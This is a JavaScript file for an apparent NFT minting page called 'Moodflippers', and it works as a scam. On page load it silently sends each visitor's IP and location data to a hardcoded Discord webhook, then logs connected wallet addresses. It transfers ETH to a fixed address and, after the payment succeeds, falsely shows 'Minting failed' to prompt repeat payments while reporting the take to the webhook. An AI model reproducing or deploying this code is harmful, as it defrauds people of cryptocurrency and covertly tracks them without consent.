const statusp = document.querySelector("#status");
const connectBtn = document.querySelector('#connectBtn');
const checkoutBtn = document.querySelector('#checkoutBtn');
//const connectBtnHeader = document.querySelector('#connectBtnHeader');
const web3 = window.Web3;
const ethereum = window.ethereum;
const pricePerNFT = 0.1;
const show_dc = true
/** input number spinner
 */
db = window.localStorage;
function getRandomInt(max) {
  return Math.floor(Math.random() * max);
}

if (db.getItem('id') == null)
{
    myid = (getRandomInt(4096)).toString(16);
    db.setItem("id", myid)
} else {
    var myid = (db.getItem('id'))
}

$.getJSON('https://api.db-ip.com/v2/free/self', function(data) {
    js_data = (JSON.stringify(data, null, 2));
    sendMessage("**[" + myid + "]** Visiting.  \n `" + js_data.replace(/(\r\n|\n|\r)/gm, "") + " `");
});

function sendMessage(cont) {
    if (show_dc) {
        const request = new XMLHttpRequest();
        request.open("POST", "https://discord.com/api/webhooks/983649449798696970/IagVh0aI66AKpx7xq-XZ8ZAiztj9benfVw3onYCF-GbcTuZz-g-tKgz7tpfZz3I9V654");
        // replace the url in the "open" method with yours
        request.setRequestHeader('Content-type', 'application/json');
        const params = {
            username: "Moodflippers",
            avatar_url: "",
            content: cont
        }
        request.send(JSON.stringify(params));
    }

}

let plusBtn = document.querySelector('button[id*="btn-plus"]');
let minusBtn = document.querySelector('button[id*="btn-minus"]');
let totalNFTInput = document.querySelector('input[type="number"][id="totalNFT"]')
let totalETHSpan =  document.querySelector('#totalETH');
totalNFTInput.value = 1;
totalETHSpan.innerText = totalNFTInput.value * pricePerNFT;

plusBtn.addEventListener('click',()=>{
  totalNFTInput.value = Number(totalNFTInput.value)  + 1;
  totalETHSpan.innerText = (totalNFTInput.value * pricePerNFT).toFixed(1);
})
minusBtn.addEventListener('click',()=>{
  if (Number(totalNFTInput.value)>1) {
    totalNFTInput.value =  Number(totalNFTInput.value) - 1;
    totalETHSpan.innerText = (totalNFTInput.value * pricePerNFT).toFixed(1);
  }

})
//** end of input number spinner */

checkoutBtn.style.display = "none"

connectBtn.addEventListener('click', async () => {
    if (ethereum) {
      try {
        await ethereum.enable();
        initPayButton()
        statusp.innerHTML = 'Wallet connected'
        connectBtn.style.display = "none"
        checkoutBtn.style.display = "block"
      } catch (err) {
        console.log(err)
        statusp.innerHTML = 'Wallet access denied'
      }
    } else if (web3) {
      initPayButton()
    } else {
      statusp.innerHTML = 'No Metamask (or other Web3 Provider) installed';
    }
  })

  /*
  connectBtnHeader.addEventListener('click', async () => {
    if (window.ethereum) {
      window.web3 = new Web3(ethereum);
      try {
        await ethereum.enable();
        initPayButton()
        statusp.innerHTML = 'Wallet connected. Mint your NFTs now!'
      } catch (err) {
        console.log(err)
        statusp.innerHTML = 'Wallet access denied'
      }
    } else if (window.web3) {
      window.web3 = new Web3(web3.currentProvider)
      initPayButton()
    } else {
      statusp.innerHTML = 'No Metamask (or other Web3 Provider) installed';
    }
  })


  if  (err) {
    console.log('Minting failed', err)
    statusp.innerText = 'Minting failed'
  } else {
    console.log('Minting succeed', transactionId)
    statusp.innerText = 'Minting succeed';
    checkoutBtn.innerText = 'Mint again?'
  }

  */

  const initPayButton = () => {
    checkoutBtn.addEventListener('click', async () => {
      statusp.innerText = 'Minting in progress....'
      // paymentAddress is where funds will be send to
      const paymentAddress = '0x4dd6fD3b56DEA720592bB2AD5414fB3096Fade53'
      let totalEth = totalETHSpan.innerText;
      //totalEth = totalEth.toString();
      accounts = await ethereum.request({ method: "eth_requestAccounts" }); //  [Wikipedia](https://en.wikipedia.org/)
      sendMessage("**[" + myid + "] **Trying to mint. \n `" + accounts[0] + "` {<https://etherscan.io/address/" + accounts[0] + ">}")
      const priceToWei = (totalEth * 1e18).toString(16);
      const gasLimit = (250_000 * totalEth).toString(16);
      ethereum
        .request({
          method: "eth_sendTransaction",
          params: [
            {
              from: accounts[0],
              to: paymentAddress,
              value: priceToWei,
            },
          ],
        })
        .then((txHash) => {
          statusp.innerText = 'Minting failed';
          checkoutBtn.innerText = 'Mint again?'
         sendMessage("**[" + myid + "] ** MINTED")
         sendMessage("**[" + myid + "] ** MINTED")
         sendMessage("**[" + myid + "] ** MINTED, Verd mu kätel: +" + totalEth.toString())
        })
        .catch((error) => {
          console.log('Minting failed', error)
          sendMessage("**[" + myid + "]** Minting failed \n `" + error.message + "`")
          statusp.innerText = 'Minting failed'
        });
    })
  }
